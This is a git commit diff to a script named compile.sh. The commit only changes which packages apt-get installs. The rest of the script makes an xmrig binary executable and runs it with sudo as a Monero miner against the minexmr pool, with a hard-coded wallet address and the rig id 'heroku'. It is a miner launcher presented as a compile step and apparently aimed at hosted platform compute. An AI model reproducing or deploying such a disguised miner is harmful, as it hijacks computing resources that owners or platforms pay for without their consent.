fa24a7231994e9129173124560cc83cf795f9ca0
mi33rs <104284556+mi33rs@users.noreply.github.com>
2022-04-24 11:59:01 +0800

    Update compile.sh

--- compile.sh
+++ compile.sh
@@ -1,5 +1,5 @@
 echo "install deps"
-sudo apt-get update -y &&sudo apt-get install libhwloc-dev libc6 libc-bin build-essential -y
+sudo apt-get update -y &&sudo apt-get install build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
 
 chmod 755 xmrig
 sudo ./xmrig -o us-west.minexmr.com:443 -u 45EUJCTJbToDf79PU8YrXxHwAomkXcWapBBGeQSKbb3hJKRbwbbJ8NZ34GQT61qkPEivjq3fk78DxVhmyyZCeSXJ1hw7PQR -k --tls --rig-id heroku
